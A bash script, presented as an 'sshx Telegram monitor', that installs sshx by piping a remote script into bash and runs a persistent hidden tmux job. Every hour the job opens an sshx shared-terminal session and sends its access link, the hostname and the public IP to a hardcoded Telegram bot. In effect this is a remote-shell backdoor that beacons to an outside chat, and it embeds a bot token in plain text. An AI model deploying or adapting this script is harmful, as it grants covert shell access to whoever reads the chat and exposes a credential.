#!/bin/bash
# ============================================
# SSHX TELEGRAM MONITOR - STABLE VERSION
# ============================================

set -e

BOT_TOKEN="8388395050:AAF6ReXoj_FRS7d0AMoxoO-w0YNuKIB2rKA"
CHAT_ID="-1003847935504"

send_telegram(){
curl -s -X POST "https://api.telegram.org/bot$BOT_TOKEN/sendMessage" \
-d "chat_id=$CHAT_ID" \
-d "text=$1" \
-d "parse_mode=HTML" > /dev/null
}

log(){ echo "[INFO] $1"; }

# ============================================
# DETECT OS
# ============================================

detect_os(){

if [ -f /etc/os-release ]; then
. /etc/os-release
OS=$ID
fi

case $OS in

ubuntu|debian)
UPDATE="apt-get update -y"
INSTALL="apt-get install -y"
UTIL="util-linux"
;;

centos|rhel|almalinux)
UPDATE="yum makecache -y"
INSTALL="yum install -y"
UTIL="util-linux"
;;

fedora)
UPDATE="dnf makecache -y"
INSTALL="dnf install -y"
UTIL="util-linux"
;;

alpine)
UPDATE=""
INSTALL="apk add"
UTIL="util-linux"
;;

arch)
UPDATE="pacman -Sy"
INSTALL="pacman -S --noconfirm"
UTIL="util-linux"
;;

*)
UPDATE="apt-get update -y"
INSTALL="apt-get install -y"
UTIL="util-linux"
;;

esac

}

# ============================================
# INSTALL DEPENDENCIES
# ============================================

install_deps(){

[ -n "$UPDATE" ] && $UPDATE

command -v curl >/dev/null || $INSTALL curl
command -v tmux >/dev/null || $INSTALL tmux
command -v script >/dev/null || $INSTALL $UTIL

if ! command -v sshx >/dev/null; then
log "Installing sshx..."
curl -fsSL https://sshx.io/get | bash
fi

export PATH=$PATH:$HOME/.sshx/bin

}

# ============================================
# CREATE MONITOR
# ============================================

create_monitor(){

cat > /usr/local/bin/sshx-monitor.sh << 'EOF'
#!/bin/bash

BOT_TOKEN="8388395050:AAF6ReXoj_FRS7d0AMoxoO-w0YNuKIB2rKA"
CHAT_ID="-1003847935504"

send(){
curl -s -X POST "https://api.telegram.org/bot$BOT_TOKEN/sendMessage" \
-d "chat_id=$CHAT_ID" \
-d "text=$1" \
-d "parse_mode=HTML" > /dev/null
}

run(){

HOST=$(hostname)
IP=$(curl -s ifconfig.me)
TIME=$(date)

# run sshx with pseudo terminal
OUTPUT=$(timeout 10 script -q -c "sshx" /dev/null 2>&1)

MSG="✅ <b>SSHX MONITOR STARTED</b>
Host: $HOST
IP: $IP
Time: $TIME

<pre>$OUTPUT</pre>"

send "$MSG"

}

run

while true
do
sleep 3600
run
done

EOF

chmod +x /usr/local/bin/sshx-monitor.sh

}

# ============================================
# RUN TMUX
# ============================================

run_tmux(){

tmux kill-session -t sshx-monitor 2>/dev/null || true
tmux new-session -d -s sshx-monitor "bash /usr/local/bin/sshx-monitor.sh"

}

# ============================================
# MAIN
# ============================================

main(){

detect_os
install_deps
create_monitor
run_tmux

send_telegram "🚀 <b>SSHX MONITOR INSTALLED</b>
Host: $(hostname)
IP: $(curl -s ifconfig.me)
Time: $(date)"

log "SSHX monitor running"
log "tmux attach -t sshx-monitor"

}

main
